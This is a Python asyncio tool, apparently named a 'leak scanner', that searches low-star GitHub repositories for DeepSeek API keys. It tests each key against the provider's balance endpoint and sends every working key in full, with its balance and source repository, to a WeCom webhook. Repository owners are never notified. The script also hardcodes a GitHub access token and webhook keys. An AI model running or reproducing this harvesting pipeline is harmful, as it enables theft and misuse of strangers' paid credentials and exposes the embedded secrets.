#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DeepSeek API Key Leak Scanner — Async 3.4 (Rate-limit Sensitive)
全异步架构：并行关键词搜索 + 流式仓库扫描 + 智能令牌池 + 智能重试抖动 + 告警去重
"""
import os
import re
import json
import asyncio
import logging
import sys
import time
import random
from datetime import datetime, timedelta, timezone
from urllib.parse import quote
import aiohttp
from aiohttp import ClientTimeout, TCPConnector

# ==========================================
# 配置参数
# ==========================================
DEFAULT_TOKENS = (
    "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"
)

# ---- 双 Webhook 配置 ----
DEFAULT_LOG_WEBHOOK = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=64eea423-1a95-482b-b5ed-05339da5c819"
DEFAULT_ALERT_WEBHOOK = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=e0778177-d8de-4f4d-8866-3471f6e7cc67"

GITHUB_TOKENS_ENV = os.getenv("GITHUB_TOKENS", DEFAULT_TOKENS)
GITHUB_TOKENS = [t.strip() for t in GITHUB_TOKENS_ENV.split(",") if t.strip()]
WECOM_LOG_WEBHOOK = os.getenv("WECOM_LOG_WEBHOOK", DEFAULT_LOG_WEBHOOK)
WECOM_ALERT_WEBHOOK = os.getenv("WECOM_ALERT_WEBHOOK", DEFAULT_ALERT_WEBHOOK)

# 并发控制（进一步下调搜索并发，降低被 Search 限流概率）
MAX_SEARCH_CONCURRENT = 2          # Search API 很严，建议 1~2
MAX_REPO_SCAN_CONCURRENT = 20
MAX_FILE_SCAN_CONCURRENT = 35
MAX_KEY_VERIFY_CONCURRENT = 12
SEARCH_PER_PAGE = 100
MAX_SEARCH_PAGES = 4               # 适当减少页数

# 关键词之间主动间隔（秒），进一步保护 Search 配额
KEYWORD_SEARCH_INTERVAL = 1.8

# 进度推送间隔
PROGRESS_REPO_INTERVAL = 5
PROGRESS_TIME_INTERVAL = 30

# 主循环每轮结束后的休息时间（秒）
ROUND_SLEEP = 20

# 文件大小上限（字节），超过则跳过
MAX_FILE_SIZE = 500_000

# ==========================================
# 关键词矩阵
# ==========================================
AI_KEYWORDS = [
    "deepseek", "deepseek-ai", "llm-api", "ai-chatbot", "chat-bot",
    "langchain", "llamaindex", "openai-compatible", "agent", "autonomous-agent",
    "gpt-wrapper", "ai-tool", "dify", "one-api", "fastgpt", "auto-gpt",
    "prompt-engineering", "chatgpt-clone", "ai-tutorial", "genai", "rag-demo",
    "sk-deepseek", "DEEPSEEK_API_KEY", "DEEPSEEK_KEY", "deepseek_api",
    "deepseek-chat", "deepseek-coder", "deepseek-v3", "deepseek-r1"
]

# ==========================================
# 基础设施
# ==========================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    stream=sys.stdout
)
logger = logging.getLogger(__name__)

DATA_DIR = "/data" if os.path.exists("/data") else "."
SEEN_KEYS_FILE = os.path.join(DATA_DIR, "seen_keys.json")
SEEN_REPOS_FILE = os.path.join(DATA_DIR, "seen_repos.json")
SENT_ALERTS_FILE = os.path.join(DATA_DIR, "sent_alerts.json")

TARGET_EXTS = (
    '.py', '.js', '.json', '.env', '.yml', '.yaml', '.txt', '.ts',
    '.properties', '.ini', '.sh', '.md', '.local', '.toml', '.cfg',
    '.conf', '.xml', '.go', '.rs', '.java', '.kt', '.swift', '.rb',
    '.php', '.c', '.cpp', '.h', '.cs', '.dockerfile', '.makefile'
)

DEEPSEEK_KEY_RE = re.compile(r'(?<![a-zA-Z0-9_-])(sk-[a-zA-Z0-9]{32,48})(?![a-zA-Z0-9_-])')
SKIP_KEY_PATTERNS = re.compile(r'test|example|xxxx|1234|placeholder|your\.key|demo|sample', re.IGNORECASE)


# ==========================================
# 智能令牌池（更敏感的限流感知）
# ==========================================
class TokenPool:
    """管理多个 GitHub Token，自动跟踪剩余配额，按需轮转"""
    def __init__(self, tokens):
        self._pool = {
            t: {
                "remaining": 5000,
                "reset_at": 0,
                "locked_until": 0,
                "last_used": 0,
                "invalid": False,
                "search_remaining": 30,   # Search API 独立配额（粗略跟踪）
            }
            for t in tokens
        }
        self._lock = asyncio.Lock()

    def status_summary(self):
        now = time.time()
        parts = []
        for i, s in enumerate(self._pool.values()):
            if s.get("invalid"):
                parts.append(f"T{i+1}:无效")
            elif now < s["locked_until"]:
                left = int(s["locked_until"] - now)
                parts.append(f"T{i+1}:限速({left}s)")
            elif s["remaining"] <= 0 and now < s["reset_at"]:
                parts.append(f"T{i+1}:耗尽")
            else:
                parts.append(f"T{i+1}:{s['remaining']}")
        return " | ".join(parts)

    async def acquire(self, prefer_search=False):
        while True:
            async with self._lock:
                now = time.time()
                candidates = []
                for token, state in self._pool.items():
                    if state.get("invalid"):
                        continue
                    if now < state["locked_until"]:
                        continue
                    if state["remaining"] <= 0 and now < state["reset_at"]:
                        continue
                    # 低配额时也允许，但优先选剩余多的
                    candidates.append((state["remaining"], token, state))

                if candidates:
                    # 优先选 remaining 最多的
                    candidates.sort(reverse=True)
                    _, token, state = candidates[0]
                    state["last_used"] = now
                    return token, state

            # 计算最短等待时间
            waits = []
            for s in self._pool.values():
                if s.get("invalid"):
                    continue
                if time.time() < s["locked_until"]:
                    waits.append(s["locked_until"] - time.time())
                elif s["remaining"] <= 0 and time.time() < s["reset_at"]:
                    waits.append(s["reset_at"] - time.time())
            min_wait = min(waits) if waits else 5.0
            wait = max(min_wait, 0.3) + random.uniform(0.05, 0.4)
            logger.info(f"⏳ 所有 Token 暂不可用，等待 {wait:.1f}s ... ({self.status_summary()})")
            await asyncio.sleep(wait)

    async def update(self, token, state, headers, success=True, is_search=False):
        async with self._lock:
            remaining = headers.get("X-RateLimit-Remaining")
            reset_at = headers.get("X-RateLimit-Reset")
            if remaining is not None:
                try:
                    state["remaining"] = int(remaining)
                except ValueError:
                    pass
            if reset_at is not None:
                try:
                    state["reset_at"] = int(reset_at)
                except ValueError:
                    pass

            # 粗略跟踪 Search 配额（GitHub 不单独返回 Search remaining，这里用 Core 做参考）
            if is_search and success and state["remaining"] > 0:
                # 实际 Search 有独立更严的限制，这里只做辅助
                pass

    async def mark_rate_limited(self, token, state, retry_after=None, is_search=False):
        async with self._lock:
            try:
                base_wait = int(retry_after) if retry_after else (90 if is_search else 60)
            except (ValueError, TypeError):
                base_wait = 90 if is_search else 60
            # 加一点抖动，避免所有协程同时醒来
            wait = base_wait * random.uniform(0.85, 1.25)
            state["locked_until"] = time.time() + wait
            state["remaining"] = 0
            logger.warning(f"🚫 Token {token[:12]}... 被限速（{'Search' if is_search else 'Core'}），锁定 {wait:.1f}s")

    async def mark_invalid(self, token, state):
        async with self._lock:
            state["invalid"] = True
            logger.error(f"❌ Token {token[:12]}... 已标记为无效（401）")


# ==========================================
# 异步 HTTP 客户端（含详细日志 + 更强重试）
# ==========================================
class AsyncGitHubClient:
    """基于 aiohttp 的异步 GitHub API 客户端"""
    def __init__(self, token_pool):
        self.token_pool = token_pool
        self._session = None
        self._sem_search = asyncio.Semaphore(MAX_SEARCH_CONCURRENT)
        self._sem_repo = asyncio.Semaphore(MAX_REPO_SCAN_CONCURRENT)
        self._sem_verify = asyncio.Semaphore(MAX_KEY_VERIFY_CONCURRENT)
        self._wecom_lock_log = asyncio.Lock()
        self._wecom_lock_alert = asyncio.Lock()
        self._search_lock = asyncio.Lock()   # 额外保护 Search 请求间隔

    async def __aenter__(self):
        connector = TCPConnector(
            limit=300,
            limit_per_host=100,
            ttl_dns_cache=300,
            force_close=False,
            enable_cleanup_closed=True,
        )
        timeout = ClientTimeout(total=20, connect=8)
        self._session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"Accept-Encoding": "gzip, deflate"},
        )
        return self

    async def __aexit__(self, *args):
        if self._session:
            await self._session.close()

    async def _request(self, url, accept_raw=False, is_search=False):
        max_attempts = 4
        for attempt in range(max_attempts):
            token, state = await self.token_pool.acquire(prefer_search=is_search)
            headers = {
                "Authorization": f"token {token}",
                "Accept": "application/vnd.github.v3.raw" if accept_raw else "application/vnd.github.v3+json",
                "User-Agent": "DeepSeek-Scanner/3.4",
            }
            try:
                async with self._session.get(url, headers=headers) as resp:
                    remaining = resp.headers.get("X-RateLimit-Remaining", "?")
                    reset = resp.headers.get("X-RateLimit-Reset", "?")
                    status = resp.status

                    # 详细日志（关键！方便你观察限流）
                    short_url = url.split("?")[0][-60:]
                    logger.info(f"[{status}] remaining={remaining} | {short_url}")

                    if status == 200:
                        await self.token_pool.update(token, state, resp.headers, success=True, is_search=is_search)
                        if accept_raw:
                            return await resp.text()
                        else:
                            return await resp.json()

                    elif status == 401:
                        await self.token_pool.mark_invalid(token, state)
                        if attempt < max_attempts - 1:
                            continue
                        return None

                    elif status in (403, 429):
                        retry_after = resp.headers.get("Retry-After")
                        await self.token_pool.mark_rate_limited(
                            token, state, retry_after, is_search=is_search
                        )
                        # 额外等待一点再重试
                        await asyncio.sleep(2 + random.uniform(0.5, 1.5))
                        if attempt < max_attempts - 1:
                            continue
                        return None

                    elif status == 404:
                        await self.token_pool.update(token, state, resp.headers, success=True)
                        return None

                    else:
                        await self.token_pool.update(token, state, resp.headers, success=True)
                        logger.warning(f"非预期状态码 {status}，跳过")
                        return None

            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.warning(f"请求异常 (attempt {attempt+1}): {type(e).__name__}")
                if attempt < max_attempts - 1:
                    sleep_time = (2 ** attempt) + random.uniform(0.2, 0.8)
                    await asyncio.sleep(sleep_time)
                    continue
                return None
        return None

    async def search_repos(self, keyword, time_threshold, page=1):
        query = f"{keyword} stars:<20 pushed:>{time_threshold}"
        url = (
            f"https://api.github.com/search/repositories"
            f"?q={quote(query)}&sort=updated&order=desc&per_page={SEARCH_PER_PAGE}&page={page}"
        )
        async with self._sem_search:
            # 额外串行间隔，进一步保护 Search 配额
            async with self._search_lock:
                result = await self._request(url, is_search=True)
                await asyncio.sleep(KEYWORD_SEARCH_INTERVAL + random.uniform(0.1, 0.4))
                return result

    async def get_tree(self, owner, repo, branch):
        url = f"https://api.github.com/repos/{owner}/{repo}/git/trees/{branch}?recursive=1"
        async with self._sem_repo:
            return await self._request(url)

    async def fetch_file(self, owner, repo, branch, path):
        url = f"https://api.github.com/repos/{owner}/{repo}/contents/{path}?ref={branch}"
        return await self._request(url, accept_raw=True)

    async def verify_key(self, key):
        """验证 DeepSeek Key，带简单重试"""
        async with self._sem_verify:
            for attempt in range(2):
                try:
                    headers = {"Authorization": f"Bearer {key}"}
                    async with self._session.get(
                        "https://api.deepseek.com/user/balance",
                        headers=headers,
                        timeout=ClientTimeout(total=10),
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            return True, data.get("balance", "未知")
                        elif resp.status in (401, 403):
                            return False, "无效"
                except Exception as e:
                    if attempt == 0:
                        await asyncio.sleep(1.5)
                        continue
                    logger.debug(f"验证 Key 异常: {e}")
            return False, "无效"

    async def send_log(self, content):
        await self._send_wecom(WECOM_LOG_WEBHOOK, content, self._wecom_lock_log)

    async def send_alert(self, content):
        await self._send_wecom(WECOM_ALERT_WEBHOOK, content, self._wecom_lock_alert)

    async def _send_wecom(self, webhook_url, content, lock):
        if not webhook_url:
            return
        for attempt in range(2):
            try:
                msg = {"msgtype": "markdown", "markdown": {"content": content}}
                async with lock:
                    async with self._session.post(
                        webhook_url, json=msg,
                        timeout=ClientTimeout(total=6)
                    ) as resp:
                        if resp.status == 200:
                            return
            except Exception:
                await asyncio.sleep(1 + random.random())


# ==========================================
# 核心扫描引擎（含告警去重）
# ==========================================
class DeepSeekScanner:
    def __init__(self, client):
        self.client = client
        self.seen_keys = self._load_json_set(SEEN_KEYS_FILE)
        self.seen_repos = self._load_json_set(SEEN_REPOS_FILE)
        self.sent_alerts = self._load_json_set(SENT_ALERTS_FILE)
        self.time_threshold = (datetime.now(timezone.utc) - timedelta(days=30)).strftime('%Y-%m-%dT%H:%M:%SZ')
        self.stats = {"keys_found": 0, "keys_valid": 0, "repos_scanned": 0, "rounds": 0}
        self._file_lock = asyncio.Lock()

    @staticmethod
    def _load_json_set(path):
        if os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    return set(json.load(f))
            except Exception:
                pass
        return set()

    async def _save_json_async(self, path, data):
        async with self._file_lock:
            try:
                def _write():
                    with open(path, 'w', encoding='utf-8') as f:
                        json.dump(list(data), f)
                await asyncio.to_thread(_write)
            except Exception as e:
                logger.error(f"保存文件失败 {path}: {e}")

    def _is_target_file(self, path, size=0):
        if size > MAX_FILE_SIZE:
            return False
        lower = path.lower()
        if lower.endswith(TARGET_EXTS):
            return True
        if any(kw in lower for kw in ('config', 'env', 'secret', 'credential', 'key', 'token', 'setting')):
            return True
        return False

    async def _scan_repo_files(self, owner, repo, branch, files):
        sem = asyncio.Semaphore(MAX_FILE_SCAN_CONCURRENT)

        async def scan_one(filepath):
            async with sem:
                content = await self.client.fetch_file(owner, repo, branch, filepath)
                if content:
                    return filepath, DEEPSEEK_KEY_RE.findall(content)
                return filepath, []

        tasks = [scan_one(f) for f in files]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        all_keys = []
        for result in results:
            if isinstance(result, Exception):
                continue
            filepath, keys = result
            for key in keys:
                if SKIP_KEY_PATTERNS.search(key):
                    continue
                if key in self.seen_keys:
                    continue
                all_keys.append((filepath, key))
        return all_keys

    async def _verify_and_report(self, owner, repo, filepath, key):
        # 先验证，成功后再写入 seen_keys，避免验证中途崩溃导致永久跳过
        valid, balance = await self.client.verify_key(key)
        self.seen_keys.add(key)
        await self._save_json_async(SEEN_KEYS_FILE, self.seen_keys)
        self.stats["keys_found"] += 1
        logger.info(f"🎯 捕获疑似 Key: {key[:8]}... 来源: {owner}/{repo}/{filepath}")

        if valid:
            self.stats["keys_valid"] += 1
            logger.warning(f"✅ 有效 Key! {key[:8]}...{key[-4:]} 余额: {balance}")
            if key not in self.sent_alerts:
                self.sent_alerts.add(key)
                await self._save_json_async(SENT_ALERTS_FILE, self.sent_alerts)
                await self.client.send_alert(
                    f"🚨 **DeepSeek Key 泄漏**\n"
                    f"> **状态**: ✅ 有效 (余额: {balance})\n"
                    f"> **仓库**: [{owner}/{repo}](https://github.com/{owner}/{repo})\n"
                    f"> **文件**: `{filepath}`\n"
                    f"> **凭证**: `{key}`"
                )
            else:
                logger.info(f"ℹ️ 该有效 Key 已在历史中报警过，跳过重复推送: {key[:8]}...")
        return valid

    async def process_repo(self, repo):
        repo_id = repo["id"]
        if repo_id in self.seen_repos:
            return None

        owner = repo["owner"]["login"]
        name = repo["name"]
        branch = repo.get("default_branch", "main")
        full_name = f"{owner}/{name}"

        tree_data = await self.client.get_tree(owner, name, branch)
        if not tree_data or "tree" not in tree_data:
            # 失败不写入 seen_repos，下次还会重试
            return (full_name, 0)

        # 只有成功拿到 tree 后才标记为已扫描
        self.seen_repos.add(repo_id)
        self.stats["repos_scanned"] += 1

        target_files = [
            it["path"] for it in tree_data["tree"]
            if it.get("type") == "blob" and self._is_target_file(it["path"], it.get("size", 0))
        ][:150]

        if not target_files:
            return (full_name, 0)

        found = await self._scan_repo_files(owner, name, branch, target_files)
        if not found:
            return (full_name, 0)

        verify_tasks = [
            self._verify_and_report(owner, name, fp, key)
            for fp, key in found
        ]
        await asyncio.gather(*verify_tasks, return_exceptions=True)
        return (full_name, len(found))

    async def _search_keyword_pages(self, keyword):
        all_repos = []
        for page in range(1, MAX_SEARCH_PAGES + 1):
            data = await self.client.search_repos(keyword, self.time_threshold, page)
            if data and "items" in data and data["items"]:
                new_repos = [r for r in data["items"] if r["id"] not in self.seen_repos]
                all_repos.extend(new_repos)
                if len(data["items"]) < SEARCH_PER_PAGE:
                    break
            else:
                break
        return keyword, all_repos

    async def run_once(self):
        self.stats["rounds"] += 1
        round_num = self.stats["rounds"]
        round_start = time.time()
        logger.info(f"═══ 第 {round_num} 轮扫描开始 ═══")
        logger.info(f"Token 状态: {self.client.token_pool.status_summary()}")

        # 顺序搜索关键词（配合内部间隔），更稳
        all_repos = {}
        for kw in AI_KEYWORDS:
            try:
                _, repos = await self._search_keyword_pages(kw)
                for r in repos:
                    all_repos[r["id"]] = r
            except Exception as e:
                logger.error(f"搜索关键词 [{kw}] 异常: {e}")

        new_repos = list(all_repos.values())
        total_repos = len(new_repos)
        logger.info(f"📂 第 {round_num} 轮: 发现 {total_repos} 个新仓库，开始扫描...")

        ts = datetime.now().strftime('%H:%M:%S')
        await self.client.send_log(
            f"🔍 **第 {round_num} 轮扫描开始** [{ts}]\n"
            f"> 发现新仓库: **{total_repos}** 个\n"
            f"> Token 状态: {self.client.token_pool.status_summary()}"
        )

        if not new_repos:
            await self._save_json_async(SEEN_REPOS_FILE, self.seen_repos)
            elapsed = time.time() - round_start
            logger.info(f"✅ 第 {round_num} 轮: 无新仓库 | 耗时 {elapsed:.1f}s")
            return

        sem = asyncio.Semaphore(MAX_REPO_SCAN_CONCURRENT)
        completed = 0
        progress_lock = asyncio.Lock()
        last_push_time = time.time()
        recent_repos = []

        async def process_with_limit(repo):
            nonlocal completed, last_push_time
            result = None
            async with sem:
                try:
                    result = await self.process_repo(repo)
                except Exception as e:
                    logger.error(f"仓库处理异常: {e}")
                    result = (f"{repo.get('owner', {}).get('login', '?')}/{repo.get('name', '?')}", 0)

            async with progress_lock:
                completed += 1
                if result:
                    recent_repos.append(result[0])
                now = time.time()
                if (completed % PROGRESS_REPO_INTERVAL == 0) or \
                   (now - last_push_time >= PROGRESS_TIME_INTERVAL) or \
                   (completed == total_repos):
                    await self._push_progress(round_num, completed, total_repos, recent_repos, last_push_time, now)
                    recent_repos.clear()
                    last_push_time = now

        await asyncio.gather(*[process_with_limit(r) for r in new_repos])

        await self._save_json_async(SEEN_REPOS_FILE, self.seen_repos)
        elapsed = time.time() - round_start
        logger.info(
            f"✅ 第 {round_num} 轮完成 | "
            f"累计 Key: {self.stats['keys_found']} | "
            f"有效: {self.stats['keys_valid']} | "
            f"已扫仓库: {len(self.seen_repos)} | "
            f"耗时: {elapsed:.1f}s"
        )

        ts_end = datetime.now().strftime('%H:%M:%S')
        await self.client.send_log(
            f"✅ **第 {round_num} 轮扫描完成** [{ts_end}]\n"
            f"> 扫描仓库: {total_repos} 个\n"
            f"> 耗时: {elapsed:.0f}s\n"
            f"> 累计发现 Key: **{self.stats['keys_found']}**\n"
            f"> 有效 Key: **{self.stats['keys_valid']}**\n"
            f"> 累计已扫仓库: {len(self.seen_repos)}\n"
            f"> Token 状态: {self.client.token_pool.status_summary()}"
        )

    async def _push_progress(self, round_num, completed, total, repo_names, last_push_time, now):
        pct = completed * 100 // total if total > 0 else 0
        interval = now - last_push_time
        name_list = "、".join(f"`{n}`" for n in repo_names[-5:])
        if not name_list:
            name_list = "—"
        await self.client.send_log(
            f"📊 **扫描进度** [{round_num}轮]\n"
            f"> 进度: **{completed}/{total}** ({pct}%) | 距上次: {interval:.0f}s\n"
            f"> 最近完成: {name_list}"
        )


# ==========================================
# 主循环
# ==========================================
async def main():
    token_pool = TokenPool(GITHUB_TOKENS)
    logger.info(f"🚀 DeepSeek 全网盲扫机 3.4 启动 | Tokens: {len(GITHUB_TOKENS)} | 关键词: {len(AI_KEYWORDS)}")
    logger.info(f"📡 日志 Webhook: {'已配置' if WECOM_LOG_WEBHOOK else '未配置'}")
    logger.info(f"🚨 告警 Webhook: {'已配置' if WECOM_ALERT_WEBHOOK else '未配置'}")
    logger.info(f"Token 初始状态: {token_pool.status_summary()}")

    async with AsyncGitHubClient(token_pool) as client:
        scanner = DeepSeekScanner(client)

        # 启动时先打一次 log，确认 webhook 和 token 可用
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        await client.send_log(
            f"🔥 **DeepSeek 全网盲扫机 3.4 启动**\n"
            f"> 启动时间: {ts}\n"
            f"> GitHub Tokens: **{len(GITHUB_TOKENS)}** 个\n"
            f"> 关键词矩阵: **{len(AI_KEYWORDS)}** 个\n"
            f"> 架构: asyncio + aiohttp 全异步\n"
            f"> 改进: 更敏感限流 + 详细请求日志 + Search 间隔保护\n"
            f"> 搜索范围: 低星(<20) + 最近30天更新\n"
            f"> 日志推送: ✅ 已就绪\n"
            f"> 告警推送: ✅ 已就绪"
        )

        while True:
            try:
                await scanner.run_once()
            except Exception as e:
                logger.error(f"轮次异常: {e}", exc_info=True)
                await client.send_log(
                    f"⚠️ **扫描异常**\n> 轮次: {scanner.stats['rounds']}\n> 错误: `{str(e)[:200]}`"
                )
                await asyncio.sleep(8)

            # 每轮结束后休息，降低被 Search 限流概率
            logger.info(f"😴 本轮结束，休息 {ROUND_SLEEP}s ...")
            await asyncio.sleep(ROUND_SLEEP)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("🛑 扫描机已停止")
